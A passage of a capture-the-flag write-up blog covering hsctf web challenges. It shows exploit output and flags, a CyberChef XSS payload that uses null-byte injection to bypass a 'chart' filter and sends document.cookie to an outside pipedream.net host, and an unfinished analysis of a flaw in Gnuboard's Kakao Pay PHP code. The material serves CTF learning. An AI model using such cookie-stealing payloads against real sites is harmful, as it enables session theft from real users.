<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Real FLAG : </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Finally I wrote the exploit code as above</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre> ⚡ root@pocas  ~  python3 poc.py
<span class="o">[</span>+] Exploit
<span class="o">[</span>+] Username  : 116588a5-5cb1-46e8-917e-5f7ea12408bf
<span class="o">[</span>+] Flag Path : /view/7fc3144da56dd8c9dbdfded1b3f35c44
<span class="o">[</span>+] Real FLAG : hsctf<span class="o">{</span>038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2<span class="o">}</span>
 ⚡ root@pocas  ~ 
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h1 id="web-cyber-headchef-390-pts">(Web) Cyber Headchef [390 pts]</h1>

<p>The Cyber Headchef challenge is Cyberchef’s v2 and this is a 0-Day Challenge. (This is an unintended solution)</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/report</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">url</span><span class="p">;</span>

  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nf">checkUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/?message=invalid argument</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nf">unescape</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">chart</span><span class="dl">'</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/?message=sorry, headchef doesn</span><span class="se">\'</span><span class="s1">t like chart!</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nf">checkRateLimit</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="s2">`/?message=rate limited`</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nf">visitUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
      <span class="p">.</span><span class="nf">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/?message=reported</span><span class="dl">'</span><span class="p">));</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>
<p>This is filtering the characters called chart among the function names used in the 1-Day exploit.  But this can be bypassed using null byte injection</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://cyberchef:8000/#recipe=Scatter_ch%00art('Line%20feed','Space',false,'','','red"&gt;&lt;script&gt;fetch("https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/".concat(document.cookie))&lt;/script&gt;',100,false)&amp;input=MTAwLCAxMDA
</pre></td></tr></tbody></table></code></div></div>
<p>So I was able to get the flag by sending the above PoC to the admin bot.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : hsctf{be9e5b8bce203e203597dca3d67e0f7a38e359a9ab7799988e888be073c78da0}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h1 id="webnot-solve-gnuboard-498-pts">(Web/Not Solve) Gnuboard [498 pts]</h1>

<p>The Gnuboard challenge is to solve it using 0-Day. This challenge was so difficult that I couldn’t solve it while the competition was in progress, and after the competition I asked <a href="https://blog.ssrf.kr/">as3617</a>.</p>

<div class="language-docker highlighter-rouge"><div class="code-header">
        <span data-label-text="Docker"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> ubuntu:20.04</span>
<span class="k">ARG</span><span class="s"> DEBIAN_FRONTEND=noninteractive</span>

<span class="k">RUN </span>apt-get update
<span class="k">RUN </span>apt-get <span class="nb">install</span> <span class="nt">-y</span> wget curl apache2 git php-gd php-mysql php

<span class="k">RUN </span>git clone https://github.com/gnuboard/gnuboard5 /tmp/gnuboard
<span class="k">RUN </span><span class="nb">cp</span> <span class="nt">-r</span> /tmp/gnuboard/<span class="k">*</span> /var/www/html
<span class="k">RUN </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/AllowOverride None/AllowOverride All/g'</span> /etc/apache2/apache2.conf

<span class="k">WORKDIR</span><span class="s"> /var/www/html</span>

<span class="k">RUN </span><span class="nb">mkdir </span>data
<span class="k">RUN </span><span class="nb">chmod </span>777 data
<span class="k">RUN </span><span class="nb">rm</span> <span class="nt">-rf</span> index.html /tmp/gnuboard

<span class="k">RUN </span><span class="nb">echo</span> <span class="s1">'$flag = "hsctf{flag_will_be_here}";'</span> <span class="o">&gt;&gt;</span> /var/www/html/common.php

<span class="k">ADD</span><span class="s"> entrypoint.sh /</span>
<span class="k">CMD</span><span class="s"> /entrypoint.sh</span>
</pre></td></tr></tbody></table></code></div></div>
<p>I could see in the docker file that the latest version of Gnuboard 5 was being used, and the flag was defined as a variable called $flag in <code class="language-plaintext highlighter-rouge">common.php</code>. So, after a long time, I started to analyze GnuBoard and found the SQL Injection vector, but it might not work well, and even if SQL Injection occurs, I don’t think I can do anything using it. So I had to give up.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Hint : Gnuboard, It really has too many functions to be a just "board". It seems the way how they implement the payment is meh.
</pre></td></tr></tbody></table></code></div></div>
<p>Hayyim Security provided a hint because there was no solver for the challenge. Hint mentioned the payment part.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
</pre></td><td class="rouge-code"><pre><span class="k">include_once</span><span class="p">(</span><span class="s1">'./_common.php'</span><span class="p">);</span>

<span class="c1">// (Skip..)</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="c1">//#############################</span>
    <span class="c1">// 인증결과 파라미터 일괄 수신</span>
    <span class="c1">//#############################</span>
    <span class="c1">//      $var = $_REQUEST["data"];</span>

    <span class="c1">//#####################</span>
    <span class="c1">// 인증이 성공일 경우만</span>
    <span class="c1">//#####################</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'resultCode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strcmp</span><span class="p">(</span><span class="s1">'0000'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'resultCode'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

        <span class="c1">//############################################</span>
        <span class="c1">// 1.전문 필드 값 설정(***가맹점 개발수정***)</span>
        <span class="c1">//############################################</span>

        <span class="nv">$charset</span> <span class="o">=</span> <span class="s1">'UTF-8'</span><span class="p">;</span>        <span class="c1">// 리턴형식[UTF-8,EUC-KR](가맹점 수정후 고정)</span>

        <span class="nv">$format</span> <span class="o">=</span> <span class="s1">'JSON'</span><span class="p">;</span>        <span class="c1">// 리턴형식[XML,JSON,NVP](가맹점 수정후 고정)</span>
        <span class="c1">// 추가적 noti가 필요한 경우(필수아님, 공백일 경우 미발송, 승인은 성공시, 실패시 모두 Noti발송됨) 미사용</span>
        <span class="c1">//String notiUrl    = "";</span>

        <span class="nv">$authToken</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'authToken'</span><span class="p">];</span>   <span class="c1">// 취소 요청 tid에 따라서 유동적(가맹점 수정후 고정)</span>

        <span class="nv">$authUrl</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'authUrl'</span><span class="p">];</span>    <span class="c1">// 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)</span>

        <span class="nv">$netCancel</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'netCancelUrl'</span><span class="p">];</span>   <span class="c1">// 망취소 API url(수신 받은f값으로 설정, 임의 세팅 금지)</span>

        <span class="c1">///$mKey = $util-&gt;makeHash(signKey, "sha256"); // 가맹점 확인을 위한 signKey를 해시값으로 변경 (SHA-256방식 사용)</span>
        <span class="nv">$mKey</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s2">"sha256"</span><span class="p">,</span> <span class="nv">$signKey</span><span class="p">);</span>

        <span class="c1">//#####################</span>
        <span class="c1">// 2.signature 생성</span>
        <span class="c1">//#####################</span>
        <span class="nv">$signParam</span><span class="p">[</span><span class="s1">'authToken'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$authToken</span><span class="p">;</span>  <span class="c1">// 필수</span>
        <span class="nv">$signParam</span><span class="p">[</span><span class="s1">'timestamp'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$timestamp</span><span class="p">;</span>  <span class="c1">// 필수</span>
        <span class="c1">// signature 데이터 생성 (모듈에서 자동으로 signParam을 알파벳 순으로 정렬후 NVP 방식으로 나열해 hash)</span>
        <span class="nv">$signature</span> <span class="o">=</span> <span class="nv">$util</span><span class="o">-&gt;</span><span class="nf">makeSignature</span><span class="p">(</span><span class="nv">$signParam</span><span class="p">);</span>


        <span class="c1">//#####################</span>
        <span class="c1">// 3.API 요청 전문 생성</span>
        <span class="c1">//#####################</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'mid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default</span><span class="p">[</span><span class="s1">'de_kakaopay_mid'</span><span class="p">];</span>   <span class="c1">// 필수</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'authToken'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$authToken</span><span class="p">;</span> <span class="c1">// 필수</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'signature'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$signature</span><span class="p">;</span> <span class="c1">// 필수</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'timestamp'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$timestamp</span><span class="p">;</span> <span class="c1">// 필수</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'charset'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$charset</span><span class="p">;</span>  <span class="c1">// default=UTF-8</span>
        <span class="nv">$authMap</span><span class="p">[</span><span class="s1">'format'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$format</span><span class="p">;</span>  <span class="c1">// default=XML</span>
        <span class="c1">//if(null != notiUrl &amp;&amp; notiUrl.length() &gt; 0){</span>
        <span class="c1">//  authMap.put("notiUrl"       ,notiUrl);</span>
        <span class="c1">//}</span>


        <span class="k">try</span> <span class="p">{</span>

            <span class="nv">$httpUtil</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HttpClient</span><span class="p">();</span>

            <span class="c1">//#####################</span>
            <span class="c1">// 4.API 통신 시작</span>
            <span class="c1">//#####################</span>

            <span class="nv">$authResultString</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="nf">processHTTP</span><span class="p">(</span><span class="nv">$authUrl</span><span class="p">,</span> <span class="nv">$authMap</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$authResultString</span> <span class="o">=</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"Http Connect Error</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">errormsg</span><span class="p">;</span>

                <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Http Connect Error"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">//############################################################</span>
            <span class="c1">//5.API 통신결과 처리(***가맹점 개발수정***)</span>
            <span class="c1">//############################################################</span>

            <span class="nv">$resultMap</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$authResultString</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

            <span class="nv">$tid</span> <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'tid'</span><span class="p">];</span>
            <span class="nv">$oid</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^A-Za-z0-9\-_]/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'MOID'</span><span class="p">]);</span>

            <span class="cd">/*************************  결제보안 추가 2016-05-18 START ****************************/</span>
            <span class="nv">$secureMap</span><span class="p">[</span><span class="s1">'mid'</span><span class="p">]</span>       <span class="o">=</span> <span class="nv">$default</span><span class="p">[</span><span class="s1">'de_kakaopay_mid'</span><span class="p">];</span>                         <span class="c1">//mid</span>
            <span class="nv">$secureMap</span><span class="p">[</span><span class="s1">'tstamp'</span><span class="p">]</span>    <span class="o">=</span> <span class="nv">$timestamp</span><span class="p">;</span>                   <span class="c1">//timestemp</span>
            <span class="nv">$secureMap</span><span class="p">[</span><span class="s1">'MOID'</span><span class="p">]</span>      <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'MOID'</span><span class="p">];</span>           <span class="c1">//MOID</span>
            <span class="nv">$secureMap</span><span class="p">[</span><span class="s1">'TotPrice'</span><span class="p">]</span>  <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'TotPrice'</span><span class="p">];</span>       <span class="c1">//TotPrice</span>

            <span class="c1">// signature 데이터 생성</span>
            <span class="nv">$secureSignature</span> <span class="o">=</span> <span class="nv">$util</span><span class="o">-&gt;</span><span class="nf">makeSignatureAuth</span><span class="p">(</span><span class="nv">$secureMap</span><span class="p">);</span>
            <span class="cd">/*************************  결제보안 추가 2016-05-18 END ****************************/</span>

            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">" select * from </span><span class="si">{</span><span class="nv">$g5</span><span class="p">[</span><span class="s1">'g5_shop_order_data_table'</span><span class="p">]</span><span class="si">}</span><span class="s2"> where od_id = '</span><span class="nv">$oid</span><span class="s2">' "</span><span class="p">;</span>
            <span class="nv">$row</span> <span class="o">=</span> <span class="nf">sql_fetch</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>

            <span class="nv">$data</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'dt_data'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'dt_data'</span><span class="p">]))</span> <span class="o">:</span> <span class="k">array</span><span class="p">();</span>

            <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'pp_id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'pp_id'</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$page_return_url</span>  <span class="o">=</span> <span class="no">G5_SHOP_URL</span><span class="mf">.</span><span class="s1">'/personalpayform.php?pp_id='</span><span class="mf">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'pp_id'</span><span class="p">];</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$page_return_url</span>  <span class="o">=</span> <span class="no">G5_SHOP_URL</span><span class="mf">.</span><span class="s1">'/orderform.php'</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nf">get_session</span><span class="p">(</span><span class="s1">'ss_direct'</span><span class="p">))</span>
                    <span class="nv">$page_return_url</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'?sw_direct=1'</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">((</span><span class="nb">strcmp</span><span class="p">(</span><span class="s1">'0000'</span><span class="p">,</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'resultCode'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$secureSignature</span><span class="p">,</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'authSignature'</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="c1">//결제보안 추가 2016-05-18</span>
                <span class="cm">/*                         * ***************************************************************************
                 * 여기에 가맹점 내부 DB에 결제 결과를 반영하는 관련 프로그램 코드를 구현한다.
                  [중요!] 승인내용에 이상이 없음을 확인한 뒤 가맹점 DB에 해당건이 정상처리 되었음을 반영함
                  처리중 에러 발생시 망취소를 한다.
                 * **************************************************************************** */</span>

                <span class="c1">//최종결제요청 결과 성공 DB처리</span>
                <span class="nv">$tno</span>        <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'tid'</span><span class="p">];</span>
                <span class="nv">$amount</span>     <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'TotPrice'</span><span class="p">];</span>
                <span class="nv">$app_time</span>   <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'applDate'</span><span class="p">]</span><span class="mf">.</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'applTime'</span><span class="p">];</span>
                <span class="nv">$pay_method</span> <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'payMethod'</span><span class="p">];</span>
                <span class="nv">$pay_type</span>   <span class="o">=</span> <span class="nv">$PAY_METHOD</span><span class="p">[</span><span class="nv">$pay_method</span><span class="p">];</span>
                <span class="nv">$depositor</span>  <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_InputName'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_InputName'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
                <span class="nv">$commid</span>     <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
                <span class="nv">$mobile_no</span>  <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'HPP_Num'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'HPP_Num'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
                <span class="nv">$app_no</span>     <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'applNum'</span><span class="p">];</span>
                <span class="nv">$card_name</span>  <span class="o">=</span> <span class="nv">$CARD_CODE</span><span class="p">[</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'CARD_Code'</span><span class="p">]];</span>
                <span class="k">switch</span><span class="p">(</span><span class="nv">$pay_type</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="s1">'계좌이체'</span><span class="o">:</span>
                        <span class="nv">$bank_name</span> <span class="o">=</span> <span class="nv">$BANK_CODE</span><span class="p">[</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'ACCT_BankCode'</span><span class="p">]];</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">[</span><span class="s1">'de_escrow_use'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
                            <span class="nv">$escw_yn</span>         <span class="o">=</span> <span class="s1">'Y'</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="s1">'가상계좌'</span><span class="o">:</span>
                        <span class="nv">$bankname</span>  <span class="o">=</span> <span class="nv">$BANK_CODE</span><span class="p">[</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_BankCode'</span><span class="p">]];</span>
                        <span class="nv">$account</span>   <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_Num'</span><span class="p">]</span><span class="mf">.</span><span class="s1">' '</span><span class="mf">.</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_Name'</span><span class="p">];</span>
                        <span class="nv">$app_no</span>    <span class="o">=</span> <span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'VACT_Num'</span><span class="p">];</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$default</span><span class="p">[</span><span class="s1">'de_escrow_use'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
                            <span class="nv">$escw_yn</span>         <span class="o">=</span> <span class="s1">'Y'</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="k">default</span><span class="o">:</span>
                        <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="nv">$inicis_pay_result</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$s</span> <span class="o">=</span> <span class="s1">'(오류코드:'</span><span class="mf">.</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'resultCode'</span><span class="p">]</span><span class="mf">.</span><span class="s1">') '</span><span class="mf">.</span><span class="nv">$resultMap</span><span class="p">[</span><span class="s1">'resultMsg'</span><span class="p">];</span>
                <span class="nf">alert</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$page_return_url</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="c1">// 수신결과를 파싱후 resultCode가 "0000"이면 승인성공 이외 실패</span>
            <span class="c1">// 가맹점에서 스스로 파싱후 내부 DB 처리 후 화면에 결과 표시</span>
            <span class="c1">// payViewType을 popup으로 해서 결제를 하셨을 경우</span>
            <span class="c1">// 내부처리후 스크립트를 이용해 opener의 화면 전환처리를 하세요</span>
            <span class="c1">//throw new Exception("강제 Exception");</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//    $s = $e-&gt;getMessage() . ' (오류코드:' . $e-&gt;getCode() . ')';</span>
            <span class="c1">//####################################</span>
            <span class="c1">// 실패시 처리(***가맹점 개발수정***)</span>
            <span class="c1">//####################################</span>
            <span class="c1">//---- db 저장 실패시 등 예외처리----//</span>
            <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">' (오류코드:'</span> <span class="mf">.</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getCode</span><span class="p">()</span> <span class="mf">.</span> <span class="s1">')'</span><span class="p">;</span>
            <span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>

            <span class="c1">//#####################</span>
            <span class="c1">// 망취소 API</span>
            <span class="c1">//#####################</span>

            <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span> <span class="c1">// 망취소 요청 API url(고정, 임의 세팅 금지)</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="nf">processHTTP</span><span class="p">(</span><span class="nv">$netCancel</span><span class="p">,</span> <span class="nv">$authMap</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"Http Connect Error</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">errormsg</span><span class="p">;</span>

                <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Http Connect Error"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">echo</span> <span class="s2">"## 망취소 API 결과 ##"</span><span class="p">;</span>

            <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"&lt;"</span><span class="p">,</span> <span class="s2">"&amp;lt;"</span><span class="p">,</span> <span class="nv">$$netcancelResultString</span><span class="p">);</span>
            <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">,</span> <span class="s2">"&amp;gt;"</span><span class="p">,</span> <span class="nv">$$netcancelResultString</span><span class="p">);</span>

            <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">,</span> <span class="nv">$netcancelResultString</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
            <span class="c1">// 취소 결과 확인</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="c1">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The above code is the Kakao Pay payment logic. The important thing here is to use the try/catch statement, and the vulnerability occurs in the catch statement.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
